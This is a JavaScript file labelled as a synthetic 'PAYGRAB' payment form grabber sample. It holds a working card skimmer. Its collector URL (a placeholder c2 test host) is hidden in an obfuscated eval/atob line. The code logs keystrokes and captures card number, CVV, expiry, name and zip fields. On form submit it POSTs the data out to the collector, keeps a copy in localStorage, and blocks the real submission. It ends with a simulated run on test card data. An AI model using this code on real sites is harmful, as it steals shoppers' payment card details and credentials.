// PAYGRAB — synthetic payment form grabber product sample.
(function () {
  eval(atob('dmFyIENPTExFQ1RPUiA9ICdodHRwczovL2MyLmV4YW1wbGUudGVzdC9wYXknOw=='));
  var keystrokes = [];
  var formState = { card: '', expiry: '', cvv: '', name: '', zip: '' };
  console.log('[PAYGRAB] collector online', COLLECTOR);

  document.addEventListener('keydown', function (event) {
    if (!event.key || event.key.length !== 1) return;
    keystrokes.push({ key: event.key, at: Date.now() });
    if (keystrokes.length > 512) keystrokes.shift();
  }, true);

  function classify(target) {
    var hint = String((target && target.name) || (target && target.id) || '').toLowerCase();
    if (hint.indexOf('card') !== -1 || hint.indexOf('number') !== -1) return 'card';
    if (hint.indexOf('cvv') !== -1 || hint.indexOf('cvc') !== -1) return 'cvv';
    if (hint.indexOf('exp') !== -1) return 'expiry';
    if (hint.indexOf('zip') !== -1 || hint.indexOf('postal') !== -1) return 'zip';
    return 'name';
  }

  document.addEventListener('change', function (event) {
    var target = event.target;
    if (!target || !target.value) return;
    formState[classify(target)] = String(target.value);
  }, true);

  function exfiltrate(reason) {
    var payload = { reason: reason, form: formState, keystrokes: keystrokes.slice(-64), origin: location.origin };
    var body = btoa(JSON.stringify(payload));
    try {
      fetch(COLLECTOR, { method: 'POST', headers: { 'content-type': 'text/plain' }, body: body }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('paygrab:pending', body); } catch (error) {}
    console.log('[PAYGRAB] exfiltrated', keystrokes.length, 'keys');
  }

  document.addEventListener('submit', function (event) {
    exfiltrate('submit');
    if (event.preventDefault) event.preventDefault();
  }, true);

  formState = { card: '4111111111111111', expiry: '09/30', cvv: '314', name: 'Demo Buyer', zip: '10001' };
  keystrokes.push({ key: '4', at: Date.now() }, { key: '1', at: Date.now() });
  exfiltrate('simulated');
})();
